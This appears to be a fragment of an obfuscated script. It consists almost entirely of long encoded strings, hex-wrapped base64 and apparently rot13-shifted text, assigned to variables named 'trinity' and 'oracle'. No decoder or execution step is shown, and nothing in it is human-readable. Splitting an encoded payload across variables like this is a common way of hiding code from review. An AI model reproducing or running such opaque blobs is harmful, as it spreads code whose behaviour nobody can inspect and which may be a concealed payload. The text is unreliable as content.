YTRjNDM2NDM4Njc0OTYxNDEzMzM1NGE1MDZkNTk2NzcyNjc0ZTYyNGM1MjU4NmU2MTM0MzQ3MDY5NTAzMjMwNjY3NDY3N2EzMjUzNTQzODQ4NzY2NjU5NzQ0NzM3MzEyZjY3NTg0YTZiNjU1OTRhNzY0YjQyNzIzNTQxNGQ1NTU5MzI2YTYzNDM1ODM2NTAyYjQ1N2E3YTU5NTI3NzZkNTg1NTQxMmY0Zjc0MzE1MDM4Nzk0MjVhN2EzOTQxMmYzNjU5NTg3ODQ1NzY2OTUzNzc1NzM0NDc3NDc1MmI1NTM0NzE2ZDRlNDc0NjQ1NGU3OTc1MzY0MTYxNzk3OTc2NDI3NjQ2NjE0OTcyNjM2NzZlNDM0YTM3NjE0NjZhMmI2ZDRiMzkzOTQyNzQzNzcwNGI2ZjM3NDE1NjZkNDQ1MDczNGM2NTRkMzE2ODM4MzM3OTQ0NmI2YjZhMzYzODc3Njk3MzVhNTIzNjMwNmQ0MjY3N2E3ODc2Mzg2NzY2Nzk2NjYzNDk2Yzc1NzYzOTQ3MmY2YTY4N2E1MDRjNDU0YTRlMmI3MTUzMmY0YTUyMzA2ODMzNTg1OTc5NGI2NjQ5NzY3ODcyNmI1Njc4NTg2ZTRkNzk1ODM4MzM1ODYxNTE1NjMxNzg2NzRhN2E3NjZmNzEzMzQ2NmQ2YTcyNjM0ZTM0NTE3MjY5NTMzNDMxMzQ3ODcyNjg2ZDRkNDg1YTM0NWE0MjRlNzA2NTU3NTA2MzUxMmYzNzY3Nzc1MTU5NDk0YzMyNjkzOTJmNDQ3ODc5NDUzODU0NTQzMjY0NGM1NTVhNzc1MzM1MzY3MzY3NzY3OTQ0MzQ1MTM1MzI0ODU4NDY0OTM4NjkzNDRlNDc2ZjJmNDIzMjM1NTUzMjYxNmYyZjQxNDYzMjU0NzI2YTU5NDY0MzU0NTgzODcyNWE2YzJmMzQ2NjRkNjc0NDc0NmIzOTM1NDE1MjJmNGQ2NjQ0MmI3MzY4MmI2NzQ1NDY3YTczNTc0NDM4NmQyYjZjMmIzMDY5NjYzNTczMzg2MjJiNjc2Njc5NDUzNDY5NTA2NjZhMzM2NjU5NjM2YzRjNzI3MTMyNDM3YTc3NGI2MzUwMzU0ODM5NjI3ODQyNDc2Mjc2NmIzODcwNTAzNjczNjg2Yzc4NGEzNTQ2MmY0YjUzNGE2Njc5NDI2MzdhNjY2NzQ3MmIzNjZlMmI0MzRmNTI0NDM5NTg3Nzc3MzQ0Yzc5NTI1OTY2Nzc2YTY2Nzk0OTY2NGEzMzY5MzE1OTU4NzQ2OTJiNDk2MzYzNDc0YjU4NjM3MjM2NmU3MzUyMmY1NTczNDY0ODM0NjI1NzU2Nzc2ZTRiNzk1MjVhMzA0MjUwNDU2NjQ0NGI1NjUwNGE0MjJmNzU2YzQxNTA3MjcxNzk1NjM1NDk1MDM0NTk0ZDQ1NmE3MTYxNTc2Yjc2NzU0ZDJmNDE2MjM1NTc3MzU0N2E1OTM3MmY0NTRmNzk2OTY2NTY1MDYyNjgzODRjNTY2Yjc1Nzk0ZjYzNTI3YTM0MzI1MjMwNzY2ZjZjNTA0NTQxNjQ2NzZjMzk0ZTZmNjk0YzZlNDMzOTRkNDg0NjYzMzg3ODQ3NmE0OTMwNTQ0YjMyNzY0YzM0NGI2NTYxNmY0ZjJiNTI2NTM0NTQ2ZjQ1NmE3MzRhNTA2ZjRmMzc2MzUyMzgyZjY0MzY2YjYxNjU3ODJmMzIyZjc4NGY1NDczNzE3Mjc5NTMzNTMwNTA3MDZmMzM1MjU0MmY2ZjU3NzY0ZjY1Nzg0MTJmNGY0ZDM5NjU0OTc2MmY2ODY2NDE2NzJiNTc1YTUwNjU0ZjQ2MmI0MjdhNGE0NTUwNTE0NTM2NDk2NzUxNmY1MDRmNGIzODY4NTA2NTc3NTE3MDJiNmY3MjcyNzA0NzU4NmI3NDdhNmE0YjJmNDI0YzMxNzIyZjc5NjM3NTZhNTk1NTU0NmU2MjZhNGM2OTQ1NzM1NzQzNTgzODQyNjY1OTRmNjY0YjU5Njk1MDRkNjc2YTY4NGQ3YTM0Nzg0ODczNmEyYjRiNjg3NzRjNzg0ZDZhNzY0ZTYzNTA3NzQyNzY1NTQxNzM0MTM5MzM0MTY0NzM1NDJiNTI2NjMyNDU2MzMxNDE1NzQ3Nzk3NTczNTk0ZTM2Mzg3MTc2MzQ1MDM5NmI2ZTMzN2E2NjRiMzQ2ZDc4Mzk2ZDVhNjM3YTJmNTk0ZjJiNDkzMzJmNmM2MjMyMzE2MjQxNjM0MzU2NjM2Mzc4Njk1ODUzNGMyYjQ1NzkyZjQxNmI3OTc3NDY2ODZlMzU0ODU2MzA1MDM4NTU1NDc4NDM2NjQ1NGY1NjcxMzM3NzZlNjU3OTY5MzU2ZTdhMzM2NzU4Nzk3MTUzNGM2YzRmNGIzOTc3NzM2ZjQ4Mzk0OTM1MmI0Yzc1NGI1YTY3NjUzNjU2MzY2OTc2NGQ1NzU3MmI1NTUyMzY3NDRkNzk0NzRkNjQ3NDM1NGY0NzQ5Mzk3ODZlNjk0YjU3Nzc0MTM5NTI0ODZjMmIzODZhNjY3MzQ1MzczNDRkNjY3Nzc3NTUzMzU5MzY2MzJmNzk2NTQ2NDYzNDZhN2E3MzQ5NjY0ZjU5MmY1NDc1NTIzNTZhMzM0NTQ3NzU0NDY4Nzg0NTZlNmYzNjYzNjcyYjc3NTgzNjMxNDQ3ODU1NzU2NjYzNjY0NTYyNjM0OTUwMmI2MTU3NTEyYjQ0Nzk3MjRmNTIyZjc3NzY3NDQ3NzgzOTcwNjY1MDQ5NjY3NzY5NDU1NjM3MzU0NTc2NWE3MTZhNTA2YjRmNzM2ZjJiMzU2NzUyNDQzMTUxNjU3MDJiNzc2MzY2NmM0Njc4NDg1OTY1Mzg1OTYzNjMzMTQ4NzIyYjQ4Mzg0MjcwMzI2YTZlNmY3MzQ5MzcyZjZlNDc0NTQ0Nzk0YjZjNjk1MDQ4NDMzODM1NTIzNDU1Mzk0MTVhMmY2NzYyMzU0ODQ3NjQ2ZjY1MzY3YTQzMzUzNDZlNmE3NjZmNmE1ODMwMzMyYjM3NWE2ZTcyNDI2YzM1NDgzMjcxNmQ1MTc1NDU0NTY2NzU1MDYxNTI0YzQ5Mzk0OTQxMmI1MjM3NGI3NTc3NTMzNDZmNGM0NDY1Nzk0NjM1NzQ0NjZiNDc0ZTY2NmI3NTY0NzY1Mjc4NDY2ZTM2NzI1MDRiN2E0NTczMmI3OTQ4Njk3NDY0MzY1MTJiMzY2NzMzMzQzNDY2MzY1ODM1NGQ2YjM3NjkyZjUzNjI2MjRjMzM0NDRlNTE3YTM0NDkzMzU1NjE0OTUxMzc0MjcyMzI0MTM5NjQ2ZjM0MzY2YjM3N2EzMzZiNGQzNDY5NDQ2ZDY2NGE3Njc5NjkyYjMzNzk0Mjc0NDk1ODM1NTM0ODRlNzk3MDc1MzA1MDc4NzMzMTRkNjY0OTM2MzgzODYxMzUzODQ3NmYzODM1NDM0ODMwNzA3ODU1NzY1NzQ4NDI1MDY5MzU2MzU5MmI0NTU0NGQ2NDcwNDc1MDQ1NjYzOTUxNjY0NjZlMzU2ZTY4MzY3NzJmNzg0YzMxNGI1ODQxNGQyYjUyNDM1ODQ5MmY0ODY5NGM2MzRiNDg3YTZhMmI2MzZlMzQ0YzY2NTE0MzY2NDU0YjY0NTU2YTUxMzAzOTdhNDk1NzcxMzg3ODc2Nzk2YTc4NzI2YTZlNjc2YzUwNmY1NjM5NjE0NzJmNGI3MDY4NzU1MDM4NTE3MzU3NjQ1ODJmNGU0NTdhNmY1NTM4NDI1MDQ4NzE2YTQ4Nzg2YjUyNDkzMTU3NDk0MTM4Njc2ZTMwNjEzOTZhNzI3MDUwMzE1MzU1NmI0MjJiNTQzMTY4NGI3NDYyN2E3NjczNzkzMTRiNjU2ZjM2Nzg1NTJiMzI1YTU4NGI2YjU3NjI0NTUyNjM0YjY0NmM0NzRkMzAzODY5NzI0NzRkNjM1MzM5N'
trinity = 'zH2ZmEuAzR0ZGWzAzV2ZwZ0ZmN2AwEvZzL2LwWzAmV0LGWzZzV3ZGMzAwRmBGExZmD1ZwquAmx0LGp0AGRmZmEwAQplMwEzAGR3BQH5AmR1AQZjAGD2AGZ3Amx2AmLmAGV2MQp5AzD2AQH3ZzV3BQIuAmD2AmD2Zmt3ZQMzZmHmAGplAmp1ZwLmAzZ0MQZ0AGtmZQEwAmL3BGEuAwH3AGHjAQxmBQIuAwL2AmZ2Zmt2BQL0ZmR0ZwH0AzL2BQquAmR0MwLmAzVmAGZjZmZ3ZmH4Zmt2BQIuAGH2LmH3AGN2Zmp4ZmR0LGEzAQH1AwZkAzR3ZmEuZmHmZwDlAQt2ZwExAwL1LGH4ATV0LGZ5AzH1BQDmAQRlMwZ0A2R2MwLlAGx3BGEuAwH2MwExZmH0AGHjAGx0AmLkAzV0MQLlAzV0MwL5AwL1AQp2ZmZ0BQH0Amt0LmZ1AQH2AmL2AzV2BQH4ZmNlLwHlZmp3BGp0Zmp0ZGDkAwR3AmD4AmH3ZQEvZmD1ZwD4ZmV0AQWvAmVmAQMzAmH3BGExAmt2LwL0ZzV0Mwp2ATH2AGL5ZmL2Mwp2AmH0ZwZ1AGV2AQH0AzH1BQDlAmx2MGp3AQp0BQZ1AGx2MwLlZmL0AmD4ATZ1AQp2AmH3ZQD4A2R1ZQL1AQV0LwL3AGD3BGEzAwR3BGZmAzL0AmZmAmVlMwMwAwZlLwHkAGN1AwDlZmt1LGH0ZmZ1LGpkAGN1ZQEuAQDmZmMvAwL0LwL0ATVlLwZmAmp2MQIuZmNmBGZ4AmtmBGMuAmDmZQquAmV0BQH5ZmxmAQD0AGN1LGZ1AGHmZmD5ZmVmBQD2AwL2LGLkAGR0LmWvAmp0AGEyAGR3Zwp5ATVlLwHmAwD2MQD0ZzL2BGEyZzL0ZGHkAwH2LmH0ZmD0LGp4AzV3Awp5AGHmAwZ1ZzL3ZwpkAmRlMwHkZmN1ZQWzAzV1BQZ0Amx2AwD3AQLmBGD5AmDmBGMvAGL2MGH2AmV1ZGH4ZmN2ZwquATL2AGD5AzL2AQDmAQt1AQEuAmp1ZQMzZmp3BQHjATL2BGD2Amt2LwD3Zmx1AGHmATL1ZQLmAmN1ZmL0AwZ2LGZ2AQZmZwD1ZmZ3ZwL3AzZmBGMuAzHmAwLkAQplMwZjAQHlMwMuAQD3AwH5ZmRmZGpkAmR0BQDmAwH2ZwL1AQLlLwEuZmt2BQLlAGp1AwZjAmV3BGH5Awt3AGDkAwLmAwD1AwH0ZGDlZmL2BGEwAzV1BGZ5A2RmZmpmAQDmZmZ3ZmD0ZwL2Zmt0ZmZ4Awp0ZwZ4AGLmBGpkAGH2ZGD2AGR2ZmL3ATZlLwp3ZmZmAQDlAmV3BQD0ZzL2AmpmAzZ0MGZmAQRmZmZkAGt2ZmMxAGL1AmZ5AQR3AwMwAGH2BGExAwH0BGHjZmx2BGHjAQRmBGIuATH3ZGL4Zmp2MQL1AQp0LGp1AGL2ZwZlATVlMwEuAzDlMwEuA2R3ZmZlATR0MwZ4AGt1AwEyAwtlMwHkZmZmAQquAGZmAGH3ZmZ0ZGHlZmZ0LGL2Awt0BQMyAmx0MwZ2AmtmAmZjATLlLwL5AzHmZwquZmp1ZwWvZzLlMwWzAwVmAGp2ATH3Amp2AzH3BQEzZmV0LwZ2AzV0ZmH4ZmN2AGZlAwV3ZmZkZmV3ZmWzAJR2ZGWvAzL3AmEyATL2AwL5ZmR2LmL0AmR2ZGEyAwH1ZwL2AGL2LmHmAwRmAGH2AQD1AmH2AmL0MwMxAmV1ZmEyAzH3ZmDkAwRlMwMzAwH3AwD3AQp2LwLlAGD0AmMvAmV0AQLkAmH2BQp2ATZmAmp4AwR2ZmZlAzD0AGL4AQL2BQH3AQHlLwpjAzZ1BGZ1AmD1AmD3AzD3ZwL4AQH0MGZ3AzL0MwH1ATH0AmL0ATRlMwH4ZmD3ZwMwAwVmZwL2Awt2MQZ2ATH0BQZ0ZmN2ZGL0Awt0AQLmZmL0BGZ4AwR3BGD3Amt3ZQZkAQD2AGpjZzVlMwpmAQx2ZwH5AmN0AQD2ATH1BQExAmZ2MwpjZzL3ZQpkAmN0MwWzAwV1ZwH5AzHmZmD0AGN2LmExAwLmBGHjZmp2ZGD0ZmL1BGLmZmx1AQHmZzV0LwD3ZmVmBGp1Amt3ZwEzAGx2AQMxAQp1BGH4ZmN0BQLmZmZ0LmEvZmH2ZmZjAzZ3ZwMxATLmAwEuAzV2MQpjAQp3AQZ3AGZ2ZwWzAGDmBQquZmDlLwH0AwV3ZQL2AzLlMwD2AzL3AwL4AwpmZGpjATZlMwMwAwR0LwH1ZzV3LGIuAGN1AmHkAwZlMwHlATL1ZQHlZmx1ZmWzATL2LwL0AGD1ZGWvA2R2ZmEzZzL1AmHkAGN1AmZkAwL1AmHkAGR3LGL5ZmN3AQD5ZmL3AQD5AwVmZGHmAmDmBGEvAGxmZGL5AJRmAwL1AzZmAGMyA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'
oracle = 'k1MTRlNjY2NzRlNjM3MTU5MzY0NjJmNzM1MTMyNGE2NjUzNzM2MjM5NDYzOTUzMzczNTUwNzU1MzQ5NjY2MTZmMmY2Njc2MmY3NDM4NTQ3ODU1NzQ3ODRlMzI0YjMwNDg0NDU1MzYzMDRiMzE1YTRhNjg1MzY4MzU1NDY4NTI1MjZjNjg0Njc1MmY0NDY0NzA0YjYzNzM2MjU3NjQ2ZDUyNDk1MjYxMzM1MjVhNTkzMjc0MzM2MjRmMzI1MTJiNzU2MTUwNjk1NzMzNTMzNjJiNzE1YTY0NTE3NzRhNTc0OTRhMzY2ODMzNmY0OTY0Nzk2OTM0NWE1OTc5NzE0Mjc4NmY0NzYxNDk2YzJiMmY2MTc4NzI2MTJmNTk2NDZjMzc2NzJiNzkzMjMzNmQ3NDQzNzk1MjRiNzY3MjMxMzk1OTJiNzQzOTc5MzEzNzc5MzE2NDcwNmMzNTc3NjE3ODM0NTU2ODUyNTQ1NTY5NDk3ODYyMmY1MjY5NjI1NzMwNzg3YTM5NTUzMDc4MzU0NjYyNDU2ODQ2NTk0ZTYyMmIzMjY5NGE1NDcwN2EzNjM1NWEyYjc4N2E1OTM3NTc2ZDM2Njc2NTcxNDY1NjQxNmY2ZjQ3NGI0NzMyNjc0ZjcxNDE2YzZjN2E0NzU2Njc0MzZjNjE2ZDRhNTA0ZTMxNDU1MjczNmM1NTJmNTkzODY5MzI3Nzc0NjQ3OTQxNmM2ODQyNjYzMTY2NjU2NzU4NmY0Nzc5Njg1MzMxMzQ3NDQ5NWE2OTcwNmM0MjRiMzA0MjU1NjE2ODM5NzQ3ODYxNDM0ODc1MzA0NTRiNDQ0NDQ3NzE2MTUwMzk1YTc0NmYzNjU4NDE0NjQ5NmU2MjMxNmU0MzJiNzQyYjYxNzgzMzU2Nzk0ZDMzMzk3NjUzNjE0MjMyNDI1MzZkNmQ3MTU2Njk0NjYxMzE2ZDY4Nzg2NzQxNmY1MzZmNjE1Njc5NTY1NDUyNGI3NDQxNTM2ZjZjNGM2MTc4Nzg1OTM4MzI0ZTYzNWE0MTRiNzk1NzYyMzA0MzcwNjg0MzY3NDI2MTY2Mzk0Mzc2NGEzNTZhNmQ2NzU4NWE0NDc5NTY3NjVhNjE0MzMyNjc3ODVhNDk3ODc4NTg0ZTcyNmUzMDZkMmI0NTY0NGQ2NDUzMzg3NzJmNzI2NDQyNGI1MjcxNzU2MjM1NDk1MzMyNDQzNjY4MzEzMDRhNzQ1MTZjNDM1NzYyNzQyYjczNDg2MjY3NTY0MjUwNmY2ZjYxNjgzMTYxNjQ3ODcxMzI3YTQ2NDMzMTRjMzA0ZTY3Njk3NDQ0NzA0MjY2NTE1NjU2NTUzMTQ4NzY2MTZkMzY2NDMwNTA3NDcwNTA0NzdhNGU1OTc5NzM2NjcyNTE0Njc1NTA2MTUwNTY2ODM5NTk3NTRiNDEzOTZmNDkzMTZiMzY3NDMxNDI3MDU4NjE3ODY2NTI1NzMxNWE3MTUwNjQ1NzQzMzIzNzQyNmYzMDU4NDc1NjQyNGY2ZDQ0NGQzNDM3NzY3NTJiNGIzMTY3NGU2MTJiMzU0NDMzNTY2MjU4NGYzMDU5NmY0MjZjNTk0ODU3NmEzNjMxMzk3NDRiNTk2NzRkMzc1MTJiNzU0YTU1NDc2MTc0NmQzMzc2NjE1NDUxNGMzOTRkNDI3NjcxNmIzNjU2Mzc1MzcxNTI2ZDM0NzA2ZjMxNTc0NzQ2NjcyZjZiNjIzMTM5NTY2OTM1NWE3MDcyMzIyZjYzNTc2ZDRjNzE1MjZjMzE3ODc5Nzc2NTc0NjI3MDYxNDg0Mjc3NmY1YTU3NmM0MjRkNGY1YTMyNTk0OTZkNjU2YTZjNTg0NzQ2MzM0NTQxMzk1MjY5NzQzMjVhNmI2ZjZhNGI0Mjc2MzI1MDM2Njg1NjRhNDMzOTUxNDU0MTc4NzUyZjJmNGE2ZTRlNTU3MTZkNmM1MjUxNmQ3NDMyNzA1NDczNj